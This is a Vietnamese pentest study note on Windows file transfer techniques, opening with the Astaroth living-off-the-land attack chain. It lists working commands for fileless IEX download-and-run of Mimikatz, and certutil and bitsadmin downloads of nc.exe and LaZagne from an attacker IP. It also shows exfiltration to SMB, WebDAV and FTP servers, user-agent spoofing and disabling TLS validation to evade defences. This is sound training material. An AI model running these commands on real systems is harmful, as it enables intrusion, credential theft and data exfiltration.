---
title: "Windows File Transfer Methods"
date: 2026-04-16 00:05:00 +0700
categories: [Pentest, File Transfer]
tags: [file-transfer, windows, powershell, smb, ftp, webdav, lolbins, bitsadmin]
---

## Case Study: Astaroth Attack (APT)

Ví dụ thực tế về **fileless attack** + **Living Off The Land (LotL)** — dùng tool hợp lệ của Windows để tấn công.

```
Email spear-phishing
→ ZIP → LNK → BAT
→ WMIC download XSL (có obfuscated JS)
→ JS gọi WMIC lần 2 → XSL thứ 2
→ Bitsadmin download encoded payloads
→ Certutil decode → DLL files
→ Regsvr32 load DLL → Reflective DLL Loading
→ Inject vào Userinit (Process Hollowing)
→ Load Astaroth (info-stealer) trong memory
```

| Tool | Chức năng hợp lệ | Bị abuse như thế nào |
|---|---|---|
| `WMIC` | Quản lý WMI | Download & execute XSL/JS |
| `Bitsadmin` | Quản lý background download | Download payload |
| `Certutil` | Quản lý certificate | Decode base64 payload |
| `Regsvr32` | Đăng ký DLL | Load & execute DLL độc hại |
| `Userinit` | Process khởi động Windows | Bị inject malware |

> Toàn bộ đều là tool hợp lệ của Windows → firewall và AV không thể chặn mà không ảnh hưởng hệ thống.
{: .prompt-warning}

---

## 📥 Download Methods

### 1. Base64 Encode & Decode

**Trên Kali (encode):**

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

**Trên Windows (decode):**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<BASE64_STRING>"))

# Unzip
Expand-Archive -Path "C:\Users\htb-student\upload_win.zip" -DestinationPath "C:\Users\htb-student\unzipped"

# Verify MD5
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

> **Giới hạn:** `cmd.exe` tối đa **8,191 ký tự** → không dùng được với file lớn.
{: .prompt-warning}

---

### 2. PowerShell WebClient — DownloadFile

```powershell
# Đồng bộ
(New-Object Net.WebClient).DownloadFile('https://<URL>/file.ps1', 'C:\Users\Public\Downloads\file.ps1')

# Bất đồng bộ
(New-Object Net.WebClient).DownloadFileAsync('https://<URL>/file.ps1', 'C:\Users\Public\Downloads\file.ps1')
```

> File ghi xuống disk → AV có thể detect.
{: .prompt-warning}

---

### 3. PowerShell DownloadString + IEX — Fileless ⭐

```powershell
# Cách 1
IEX (New-Object Net.WebClient).DownloadString('https://<URL>/Invoke-Mimikatz.ps1')

# Cách 2 — Pipe vào IEX
(New-Object Net.WebClient).DownloadString('https://<URL>/Invoke-Mimikatz.ps1') | IEX
```

> **IEX = Invoke-Expression:** Nhận vào **string** → thực thi như PowerShell code (tương đương `eval()` trong Python). Chỉ dùng để chạy **PowerShell script (.ps1)**, không chạy được `.exe`.
{: .prompt-info}

> **Fileless** = không ghi file xuống disk → AV truyền thống gần như không detect được.
{: .prompt-tip}

---

### 4. Invoke-WebRequest

```powershell
# Download cơ bản
Invoke-WebRequest https://<URL>/PowerView.ps1 -OutFile PowerView.ps1

# Alias ngắn hơn (iwr = wget = curl trong PowerShell)
iwr https://<URL>/PowerView.ps1 -OutFile PowerView.ps1

# Giả User-Agent Chrome để bypass web filtering
Invoke-WebRequest http://<URL>/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```

---

### 5. Bitsadmin (LotL)

```cmd
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

---

### 6. Certutil (LotL)

```cmd
certutil -urlcache -split -f "http://<attacker_ip>:8000/LaZagne.exe" LaZagne.exe
```

---

### 7. SMB Download — impacket-smbserver

**Kali — Dựng SMB server:**

```bash
# Không cần auth
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Có auth
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

**Windows — Download:**

```cmd
copy \\192.168.220.133\share\nc.exe

# Nếu bị chặn guest access → mount drive
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

> Windows mới chặn unauthenticated guest access theo mặc định → dùng `-user -password`.
{: .prompt-warning}

---

### 8. FTP Download

**Kali — Dựng FTP server:**

```bash
sudo python3 -m pyftpdlib --port 21
```

**Windows — PowerShell:**

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

**Windows — Non-interactive shell:**

```cmd
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```

> **Khi nào dùng cách non-interactive?** Khi không có interactive shell (web shell, reverse shell giới hạn) — tạo file lệnh trước, FTP client đọc và chạy tuần tự.
{: .prompt-tip}

---

## 📤 Upload Methods

### 1. Base64 Upload — Windows → Kali

**Windows:**

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

**Kali:**

```bash
echo <BASE64_STRING> | base64 -d > hosts
md5sum hosts
```

---

### 2. PowerShell Web Upload — uploadserver

**Kali:**

```bash
python3 -m uploadserver
```

**Windows:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://.../PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

---

### 3. SMB Upload — WebDAV

> **Vấn đề:** Firewall doanh nghiệp thường **chặn SMB (TCP/445) ra ngoài**.
{: .prompt-warning}

> **Giải pháp:** WebDAV = SMB chạy trên nền **HTTP/HTTPS (port 80/443)** → không bị chặn. Windows tự động fallback: thử SMB trước → không được → thử HTTP (WebDAV).
{: .prompt-tip}

**Kali:**

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

**Windows:**

```cmd
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

> `DavWWWRoot` là keyword đặc biệt của Windows Shell — kết nối đến root của WebDAV server, không phải tên thư mục thật.
{: .prompt-info}

---

### 4. FTP Upload

**Kali:**

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

**Windows:**

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

---

### 5. SCP

```bash
# Windows → Linux
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip

# Linux → Windows
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```

---

## Common Errors

### Lỗi 1: IE Engine Not Available

```
The response content cannot be parsed because the Internet Explorer engine is not available
```

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### Lỗi 2: SSL/TLS Certificate Not Trusted

```
Could not establish trust relationship for the SSL/TLS secure channel.
```

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

---

## Bảng so sánh tổng hợp

| Method | Hướng | Fileless? | Ghi disk? | Ghi chú |
|---|---|---|---|---|
| Base64 + clipboard | ↕ | ✅ | ❌ | Dùng khi không có network |
| `DownloadFile` | ↓ | ❌ | ✅ | Nhanh, phổ biến |
| `DownloadString + IEX` | ↓ | ✅ | ❌ | **Stealth nhất** |
| `Invoke-WebRequest` | ↓ | ❌ | ✅ | Có thể fake User-Agent |
| `Bitsadmin` | ↓ | ❌ | ✅ | LotL |
| `Certutil` | ↓ | ❌ | ✅ | LotL |
| SMB (impacket) | ↓ | ❌ | ✅ | Bị chặn khi ra ngoài LAN |
| SMB qua WebDAV | ↑ | ❌ | ✅ | Bypass firewall chặn SMB |
| FTP | ↕ | ❌ | ✅ | Hỗ trợ non-interactive shell |
| `uploadserver` + PSUpload | ↑ | ❌ | ✅ | Upload đơn giản |
| SCP | ↕ | ❌ | ✅ | Cần SSH access |

---

## Nguyên tắc chọn method

```
Bị chặn hoàn toàn, không có network?  → Base64 + clipboard
Cần stealth, không để lại file?        → DownloadString + IEX
Cần lưu file dùng lại?                 → DownloadFile / iwr
AV chặn / web filtering?               → Fake User-Agent Chrome
Firewall chặn tool lạ?                 → Bitsadmin / Certutil (LotL)
SMB bị chặn ra ngoài LAN?              → WebDAV (SMB over HTTP)
Không có interactive shell?            → FTP command file
Cần upload từ Windows về Kali?         → uploadserver / Netcat + base64
```
